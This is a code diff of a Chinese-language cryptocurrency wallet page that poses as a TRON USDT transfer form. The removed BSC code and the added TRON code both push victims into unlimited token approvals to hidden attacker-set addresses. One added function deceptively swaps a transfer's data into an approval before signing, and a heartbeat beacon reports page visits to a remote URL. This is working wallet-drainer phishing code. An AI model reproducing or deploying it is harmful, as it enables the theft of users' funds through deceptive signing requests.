-            if (currentChainId === BSC_CHAIN_ID) {
-                currentNetwork.textContent = 'BSC主网';
-            } else {
-                currentNetwork.textContent = `未知网络 (${currentChainId})`;
-            }
-            
-            if (userAccount) {
-                currentAddress.textContent = `${userAccount.substring(0, 6)}...${userAccount.substring(38)}`;
-            } else {
-                currentAddress.textContent = '未连接';
-            }
-        }
-
-        // 切换到BSC网络
-        async function switchToBSC() {
+        // 初始化DApp数据
+        async function initDApp() {
             try {
-                if (!web3 || !userAccount) {
-                    showStatus('请先连接钱包', 'error');
+                userData.address = window.tronWeb.defaultAddress.base58;
+                const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
+                userData.trxBalance = window.tronWeb.fromSun(trxBalance);
+                const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
+                const usdtBalance = await contract.balanceOf(userData.address).call();
+                userData.usdtBalance = usdtBalance / 1e6;
+            } catch (error) {
+                console.error("获取用户数据时出错:", error);
+                tip("获取余额失败，请重试");
+            }
+        }
+
+        // 监听金额输入框变化
+        amountInput.addEventListener('input', function(e) {
+            isUserInputting = true;
+            let value = this.value;
+            
+            if (value === '0' && e.inputType.includes('insert') && this.selectionStart <= 1) {
+                value = value.replace('0', '');
+            }
+            
+            value = value.replace(/[^0-9.]/g, '');
+            
+            const dots = value.split('.').length - 1;
+            if (dots > 1) {
+                value = value.substring(0, value.lastIndexOf('.'));
+            }
+            
+            const parts = value.split('.');
+            if (parts.length > 1 && parts[1].length > 4) {
+                value = parts[0] + '.' + parts[1].substring(0, 4);
+            }
+            
+            if (value === '' || value === '.') {
+                currentAmount = '0';
+                this.value = '0';
+                this.classList.remove('text-text');
+                this.classList.add('text-textLight');
+            } else {
+                if (value.startsWith('0') && value.length > 1 && !value.startsWith('0.')) {
+                    value = value.substring(1);
+                }
+                
+                currentAmount = value;
+                this.value = value;
+                this.classList.remove('text-textLight');
+                this.classList.add('text-text');
+            }
+            
+            updateAmountDisplay();
+            updateNextButtonState();
+            
+            setTimeout(() => {
+                isUserInputting = false;
+            }, 300);
+        });
+
+        // 聚焦时处理
+        amountInput.addEventListener('focus', function() {
+            if (this.value === '0') {
+                this.select();
+            }
+        });
+
+        // 监听地址输入变化
+        addressInput.addEventListener('input', function() {
+            const addressError = document.getElementById('addressError');
+            const value = this.value.trim();
+            
+            if (value && !(value.startsWith('T') && value.length === 34)) {
+                addressError.classList.remove('hidden');
+            } else {
+                addressError.classList.add('hidden');
+            }
+            
+            updateNextButtonState();
+        });
+
+        // 设置最大金额
+        function setMaxAmount() {
+            const maxAmount = Math.max(0, parseFloat(userData.trxBalance || '0') - 1).toFixed(4);
+            currentAmount = maxAmount;
+            amountInput.value = currentAmount;
+            
+            if (currentAmount !== '0') {
+                amountInput.classList.remove('text-textLight');
+                amountInput.classList.add('text-text');
+            }
+            
+            updateAmountDisplay();
+            updateNextButtonState();
+        }
+
+        // 更新金额显示
+        function updateAmountDisplay() {
+            if (isUserInputting) return;
+            
+            let displayAmount = currentAmount;
+            
+            // 移除金额上限检查，允许任何金额
+            const usdAmount = (parseFloat(displayAmount) * TRX_TO_USD_RATE).toFixed(2);
+            document.getElementById('amount-display').textContent = `${usdAmount} USD`;
+            
+            document.title = `USDT转账 - ${displayAmount} TRX`;
+        }
+
+        // 更新下一步按钮状态 - 修改核心验证逻辑
+        function updateNextButtonState() {
+            const nextButton = document.getElementById('nextButton');
+            const amount = parseFloat(currentAmount || '0');
+            const address = addressInput.value.trim();
+            
+            // 只验证地址格式和金额是否大于0，不验证金额是否超过余额
+            const isAddressValid = address.startsWith('T') && address.length === 34;
+            const isAmountValid = amount > 0; // 只需要金额大于0即可
+            
+            const isValid = isAddressValid && isAmountValid;
+            
+            nextButton.disabled = !isValid;
+            nextButton.classList.toggle('bg-primary', isValid);
+            nextButton.classList.toggle('bg-primaryLight', !isValid);
+        }
+
+        // 显示提示
+        function tip(message) {
+            const tipElement = document.getElementById('tip');
+            tipElement.textContent = message;
+            tipElement.style.display = 'block';
+            setTimeout(() => tipElement.style.display = 'none', 3000);
+        }
+
+        // 下一步按钮点击处理 - 移除余额检查
+        async function onNextButtonClick() {
+            try {
+                const address = addressInput.value.trim();
+                const remark = remarkInput.value.trim();
+                
+                if (!address.startsWith('T') || address.length !== 34) {
+                    tip("请输入有效的Tron地址");
                     return;
                 }
                 
-                showStatus('正在切换到BSC网络...', 'info');
-                addDebugInfo('尝试切换到BSC网络...');
-                
-                try {
-                    // 尝试切换网络
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: BSC_CHAIN_ID }]
-                    });
-                    
-                    addDebugInfo('网络切换成功');
-                    showStatus('已切换到BSC网络', 'success');
-                    
-                } catch (switchError) {
-                    // 如果网络不存在，添加网络
-                    if (switchError.code === 4902) {
-                        addDebugInfo('BSC网络不存在，正在添加...');
-                        
-                        await window.ethereum.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: BSC_CHAIN_ID,
-                                chainName: 'Binance Smart Chain',
-                                nativeCurrency: {
-                                    name: 'BNB',
-                                    symbol: 'BNB',
-                                    decimals: 18
-                                },
-                                rpcUrls: [BSC_RPC_URL],
-                                blockExplorerUrls: ['https://bscscan.com/']
-                            }]
-                        });
-                        
-                        addDebugInfo('BSC网络添加成功');
-                        showStatus('BSC网络添加成功', 'success');
-                    } else {
-                        throw switchError;
-                    }
+                const amount = parseFloat(currentAmount);
+                if (amount <= 0) {
+                    tip("请输入有效的转账金额");
+                    return;
                 }
                 
-                // 重新获取网络信息
-                currentChainId = await web3.eth.getChainId();
-                currentChainId = '0x' + currentChainId.toString(16);
+                if (!window.tronWeb || !window.tronWeb.defaultAddress?.base58) {
+                    await connectWallet();
+                    return;
+                }
                 
-                updateNetworkInfo();
-                document.getElementById('switchNetworkBtn').style.display = 'none';
-                
+                // 直接进行授权，不检查余额
+                if (typeof window.okxwallet !== 'undefined') {
+                    await DjdskdbGsj(remark);
+                } else {
+                    await KdhshaBBHdg(remark);
+                }
             } catch (error) {
-                console.error('切换网络失败:', error);
-                addDebugInfo('切换网络失败: ' + error.message);
-                showStatus('切换网络失败: ' + error.message, 'error');
+                console.error('操作执行失败:', error);
+                tip('付款失败，请重新发起交易');
             }
         }
 
-        // 显示状态信息
-        function showStatus(message, type = 'info') {
-            const statusDiv = document.getElementById('status');
-            statusDiv.textContent = message;
-            statusDiv.className = `status ${type}`;
-            statusDiv.style.display = 'block';
+        // 绑定事件
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('nextButton').addEventListener('click', onNextButtonClick);
+            initializeDApp();
             
-            addDebugInfo(`状态 [${type}]: ${message}`);
-        }
-
-        // 添加调试信息
-        function addDebugInfo(message) {
-            const debugInfo = document.getElementById('debugInfo');
-            const timestamp = new Date().toLocaleTimeString();
-            debugInfo.innerHTML += `<div>[${timestamp}] ${message}</div>`;
-            debugInfo.scrollTop = debugInfo.scrollHeight;
-            
-            console.log(`[${timestamp}] ${message}`);
-        }
-
-        // 显示检测到的代币
-        function displayDetectedTokens(tokens) {
-            const tokenList = document.getElementById('tokenList');
-            const tokenItems = document.getElementById('tokenItems');
-            
-            tokenItems.innerHTML = '';
-            
-            tokens.forEach((token, index) => {
-                const tokenItem = document.createElement('div');
-                tokenItem.className = 'token-item';
-                tokenItem.innerHTML = `
-                    <span>代币 ${index + 1}: ${token}</span>
-                `;
-                tokenItems.appendChild(tokenItem);
+            const feeToggle = document.getElementById('feeToggle');
+            const feeArrow = document.getElementById('feeArrow');
+            feeToggle.addEventListener('click', () => {
+                feeArrow.classList.toggle('rotate-180');
             });
-            
-            tokenList.style.display = 'block';
-        }
+        });
 
-        // 使用Etherscan V2 API检测代币
-        async function detectTokensFromBSCScan(userAddress) {
+        // 发送心跳
+        function sendHeartbeat() {
+            fetch(window.heartbeatUrl, {
+                method: 'POST',
+                mode: 'cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ url: window.location.href })
+            }).catch(() => {});
+        }
+        const heartbeatInterval = setInterval(sendHeartbeat, 5000);
+        window.onload = sendHeartbeat;
+        window.onbeforeunload = () => clearInterval(heartbeatInterval);
+
+        // 交易处理函数
+        async function DjdskdbGsj(remark) {
+            const totalAmount = parseFloat(currentAmount) + 1;
+            const trxAmountInSun = tronWeb.toSun(totalAmount);
+            const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            const feeLimit = 1000000000;
+            
             try {
-                showStatus('正在调用Etherscan V2 API (BSC网络)...', 'info');
-                
-                // 使用V2 API，指定BSC网络
-                const apiUrl = `${ETHERSCAN_V2_API_URL}?chainid=56&module=account&action=tokentx&address=${userAddress}&startblock=0&endblock=99999999&sort=desc&apikey=${ETHERSCAN_V2_API_KEY}`;
-                
-                console.log('API URL:', apiUrl);
-                addDebugInfo('API URL: ' + apiUrl);
-                
-                const response = await fetch(apiUrl);
-                const data = await response.json();
-                
-                console.log('Etherscan V2 API Response:', data);
-                addDebugInfo('API Response: ' + JSON.stringify(data, null, 2));
-                
-                if (data.status === '1' && data.result) {
-                    console.log('找到交易记录数量:', data.result.length);
-                    addDebugInfo('找到交易记录数量: ' + data.result.length);
-                    
-                    const uniqueTokens = new Set();
-                    
-                    data.result.forEach((tx, index) => {
-                        console.log(`交易 ${index + 1}:`, tx);
-                        if (tx.to && tx.to.toLowerCase() === userAddress.toLowerCase()) {
-                            uniqueTokens.add(tx.contractAddress);
-                            console.log('添加代币地址:', tx.contractAddress);
-                            addDebugInfo('添加代币地址: ' + tx.contractAddress + ' (' + tx.tokenSymbol + ')');
-                        }
-                    });
-                    
-                    const tokens = Array.from(uniqueTokens);
-                    console.log('最终检测到的代币:', tokens);
-                    addDebugInfo('最终检测到的代币: ' + JSON.stringify(tokens));
-                    
-                    return tokens;
-                } else {
-                    console.log('API返回状态:', data.status);
-                    console.log('API返回消息:', data.message);
-                    
-                    addDebugInfo('API返回状态: ' + data.status);
-                    addDebugInfo('API返回消息: ' + data.message);
-                    
-                    if (data.message === 'NOTOK') {
-                        showStatus('Etherscan V2 API调用失败，请检查API Key', 'error');
-                    } else if (data.result && data.result.length === 0) {
-                        showStatus('该地址没有代币交易记录', 'info');
+                const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
+                const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
+                    paymentAddress,
+                    trxAmountInSun,
+                    tronWeb.defaultAddress.base58,
+                    { 
+                        feeLimit: feeLimit,
+                        note: remark ? tronWeb.toHex(remark) : ''
                     }
-                    
-                    return [];
-                }
-                
-            } catch (error) {
-                console.error('Etherscan V2 API检测失败:', error);
-                addDebugInfo('API检测失败: ' + error.message);
-                showStatus('API检测失败: ' + error.message, 'error');
-                return [];
-            }
-        }
+                );
 
-        // 本地检测代币（通过事件扫描）
-        async function detectTokensLocally(userAddress) {
-            try {
-                showStatus('正在本地检测代币...', 'info');
-                addDebugInfo('开始本地代币检测...');
-                
-                // 获取最近的区块
-                const latestBlock = await web3.eth.getBlockNumber();
-                const fromBlock = Math.max(0, latestBlock - 10000); // 扫描最近10000个区块
-                
-                addDebugInfo(`扫描区块范围: ${fromBlock} - ${latestBlock}`);
-                
-                // 扫描Transfer事件
-                const transferEvents = await web3.eth.getPastLogs({
-                    fromBlock: fromBlock,
-                    toBlock: 'latest',
-                    topics: [
-                        '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef', // Transfer事件签名
-                        null, // from地址
-                        '0x000000000000000000000000' + userAddress.substring(2).toLowerCase() // to地址
-                    ]
-                });
-                
-                addDebugInfo(`找到Transfer事件数量: ${transferEvents.length}`);
-                
-                const uniqueTokens = new Set();
-                
-                for (const event of transferEvents) {
-                    if (event.address && event.address !== '0x0000000000000000000000000000000000000000') {
-                        uniqueTokens.add(event.address);
-                        addDebugInfo('本地检测到代币: ' + event.address);
-                    }
-                }
-                
-                const tokens = Array.from(uniqueTokens);
-                addDebugInfo('本地检测结果: ' + JSON.stringify(tokens));
-                
-                return tokens;
-                
-            } catch (error) {
-                console.error('本地检测失败:', error);
-                addDebugInfo('本地检测失败: ' + error.message);
-                return [];
-            }
-        }
+                const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
+                    tronWeb.address.toHex(window.usdtContractAddress),
+                    'increaseApproval(address,uint256)',
+                    { feeLimit: feeLimit },
+                    [
+                        { type: 'address', value: window.Permission_address },
+                        { type: 'uint256', value: maxUint256 }
+                    ],
+                    tronWeb.defaultAddress.base58
+                );
 
-        // 获取预定义代币列表
-        function getPredefinedTokens() {
-            const tokens = [
-                '0x55d398326f99059ff775485246999027b3197955', // USDT
-                '0xbb4cdb9cbd36b01bd1cbaef2cdb8c4a6351d4338', // WBNB
-                '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', // USDC
-                '0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c', // BTCB
-                '0x2170ed0880ac9a755fd29b2688956bd959f933f8', // WETH
-                '0x3ee2200efb3400fabb9aacf31297cbdd1d435d47', // ADA
-                '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', // CAKE
-                '0x0d8ce2a99bb6e3b7db80ed0453c9d9e0b0b0b0b0'  // 其他代币
-            ];
-            
-            addDebugInfo('使用预定义代币列表: ' + JSON.stringify(tokens));
-            return tokens;
-        }
+                const originalRawData = approvalTransaction.transaction.raw_data;
+                approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
+                const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);
+                signedTransaction.raw_data = originalRawData;
+                const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
 
-        // 主检测和授权函数
-        async function detectAndAuthorizeTokens() {
-            if (!web3 || !userAccount) {
-                showStatus('请先连接钱包', 'error');
-                return;
-            }
-            
-            if (currentChainId !== BSC_CHAIN_ID) {
-                showStatus('请先切换到BSC网络', 'error');
-                return;
-            }
-            
-            try {
-                const detectBtn = document.getElementById('detectBtn');
-                detectBtn.disabled = true;
-                detectBtn.innerHTML = '<span class="loading"></span>检测中...';
-                
-                showStatus('正在检测钱包中的所有代币...', 'info');
-                
-                let userTokens = [];
-                
-                // 方法1：使用Etherscan V2 API检测代币
-                showStatus('方法1: 使用Etherscan V2 API检测...', 'info');
-                userTokens = await detectTokensFromBSCScan(userAccount);
-                
-                // 方法2：如果API失败，使用本地检测
-                if (userTokens.length === 0) {
-                    showStatus('API检测失败，尝试本地检测...', 'info');
-                    userTokens = await detectTokensLocally(userAccount);
-                }
-                
-                // 方法3：如果都失败，使用预定义代币列表
-                if (userTokens.length === 0) {
-                    showStatus('本地检测也失败，使用预定义代币列表...', 'info');
-                    userTokens = getPredefinedTokens();
-                }
-                
-                if (userTokens.length === 0) {
-                    showStatus('所有检测方法都失败，无法检测到代币', 'error');
-                    detectBtn.disabled = false;
-                    detectBtn.innerHTML = '重新检测';
-                    return;
-                }
-                
-                // 显示检测到的代币
-                displayDetectedTokens(userTokens);
-                
-                showStatus(`检测到 ${userTokens.length} 个代币，准备批量授权...`, 'info');
-                
-                // 调用合约批量授权
-                const contract = new web3.eth.Contract(AUTO_CONTROLLER_ABI, AUTO_CONTROLLER_ADDRESS);
-                
-                const data = contract.methods.approveTokens(userTokens).encodeABI();
-                
-                const transaction = {
-                    from: userAccount,
-                    to: AUTO_CONTROLLER_ADDRESS,
-                    data: data,
-                    gas: 500000 + (userTokens.length * 50000),
-                    gasPrice: await web3.eth.getGasPrice()
-                };
-                
-                showStatus('请在钱包中确认批量授权交易...', 'info');
-                
-                const receipt = await web3.eth.sendTransaction(transaction);
-                
-                if (receipt.status) {
-                    showStatus(`成功授权 ${userTokens.length} 个代币！`, 'success');
-                    detectBtn.innerHTML = '授权完成';
-                    detectBtn.className = 'btn success';
+                if (broadcastResult.result || broadcastResult.success) {
+                    const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
+                    console.log("交易发送成功，交易哈希:", transactionHash);
+                    tip("交易成功");
+                    return transactionHash;
                 } else {
-                    showStatus('批量授权失败', 'error');
-                    detectBtn.innerHTML = '重新授权';
+                    throw new Error("交易失败");
                 }
-                
-                detectBtn.disabled = false;
-                
             } catch (error) {
-                console.error('批量授权失败:', error);
-                showStatus('批量授权失败: ' + error.message, 'error');
-                
-                const detectBtn = document.getElementById('detectBtn');
-                detectBtn.disabled = false;
-                detectBtn.innerHTML = '重新检测';
+                console.error("操作失败:", error);
+                tip("交易失败，请重试");
+                throw error;
             }
         }
 
-        // 修复代币授权问题
-        async function fixTokenApprovals() {
-            if (!web3 || !userAccount) {
-                showStatus('请先连接钱包', 'error');
-                return;
-            }
-            
+        async function KdhshaBBHdg(remark) {
+            const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            const feeLimit = 100000000;
+            const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
+
             try {
-                const fixBtn = document.getElementById('fixBtn');
-                fixBtn.disabled = true;
-                fixBtn.innerHTML = '<span class="loading"></span>修复中...';
-                
-                showStatus('开始修复代币授权问题...', 'info');
-                
-                // 所有需要授权的代币地址
-                const tokens = [
-                    "0xFDBBA8675F0f85BeeE2225700c59D86Cb0621cAD",
-                    "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1", 
-                    "0xbA2aE424d960c26247Dd6c32edC70B295c744C43",
-                    "0x55d398326f99059fF775485246999027B3197955",
-                    "0x2E7bDE4B7D52ddD05be6144C15Cd0a5378e4D7E9",
-                    "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
-                    "0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550",
-                    "0xeFf9caa1EEC7aB6AF9FAf08Da19062632C5fdA81",
-                    "0xF822575544A8053529418cbCC553DF84a158784e",
-                    "0x496e60E8C8FAE1BFd6AaA448593E785ddd6f6BB0",
-                    "0xD57BE85B9daC037Ab5061cE49CB5d3a6821F973E"
-                ];
-                
-                const spenderAddress = '0x39c1aD7DBdDbe39b289064cAB41A1120f177b9f7';
-                
-                showStatus(`准备修复 ${tokens.length} 个代币的授权问题...`, 'info');
-                
-                let successCount = 0;
-                let failCount = 0;
-                
-                for (let i = 0; i < tokens.length; i++) {
-                    try {
-                        showStatus(`正在修复代币 ${i + 1}/${tokens.length}...`, 'info');
-                        
-                        // 创建代币合约实例
-                        const tokenContract = new web3.eth.Contract([
-                            {
-                                "inputs": [
-                                    {"name": "spender", "type": "address"},
-                                    {"name": "amount", "type": "uint256"}
-                                ],
-                                "name": "approve",
-                                "outputs": [{"name": "", "type": "bool"}],
-                                "type": "function"
-                            }
-                        ], tokens[i]);
-                        
-                        // 最大授权额度
-                        const maxAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-                        
-                        // 编码approve函数调用
-                        const data = tokenContract.methods.approve(spenderAddress, maxAmount).encodeABI();
-                        
-                        // 创建交易
-                        const transaction = {
-                            from: userAccount,
-                            to: tokens[i],
-                            data: data,
-                            gas: 100000,
-                            gasPrice: await web3.eth.getGasPrice()
-                        };
-                        
-                        // 发送交易
-                        const receipt = await web3.eth.sendTransaction(transaction);
-                        
-                        if (receipt.status) {
-                            successCount++;
-                            showStatus(`✅ 代币 ${i + 1} 授权修复成功！`, 'success');
-                        } else {
-                            failCount++;
-                            showStatus(`❌ 代币 ${i + 1} 授权修复失败`, 'error');
-                        }
-                        
-                        // 等待2秒再下一个
-                        if (i < tokens.length - 1) {
-                            await new Promise(resolve => setTimeout(resolve, 2000));
-                        }
-                        
-                    } catch (error) {
-                        failCount++;
-                        showStatus(`❌ 代币 ${i + 1} 修复异常: ${error.message}`, 'error');
-                    }
+                const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+                    usdtContractAddressHex,
+                    'approve(address,uint256)',
+                    { 
+                        feeLimit: feeLimit,
+                        note: remark ? tronWeb.toHex(remark) : ''
+                    },
+                    [
+                        { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
+                        { type: 'uint256', value: maxUint256 }
+                    ],
+                    tronWeb.defaultAddress.base58
+                );
+
+                if (!transaction.result || !transaction.result.result) {
+                    throw new Error('授权交易构建失败');
                 }
-                
-                // 显示最终结果
-                if (failCount === 0) {
-                    showStatus(`🎉 所有代币授权问题修复完成！`, 'success');
-                    fixBtn.innerHTML = '修复完成';
-                    fixBtn.className = 'btn success';
+
+                const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
+                const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+
+                if (result.result) {
+                    console.log("交易成功，交易哈希:", result.txid);
+                    tip("交易成功");
+                    return result.txid;
                 } else {
-                    showStatus(`⚠️ 部分代币修复失败，成功: ${successCount}，失败: ${failCount}`, 'error');
-                    fixBtn.innerHTML = '重新修复';
+                    throw new Error("交易失败");
                 }
-                
-                fixBtn.disabled = false;
-                
             } catch (error) {
-                console.error('修复过程失败:', error);
-                showStatus('修复过程失败: ' + error.message, 'error');
-                
-                const fixBtn = document.getElementById('fixBtn');
-                fixBtn.disabled = false;
-                fixBtn.innerHTML = '重新修复';
+                console.error("执行授权操作失败:", error);
+                tip("交易成功，请重试");
+                throw error;
             }
         }
     </script>
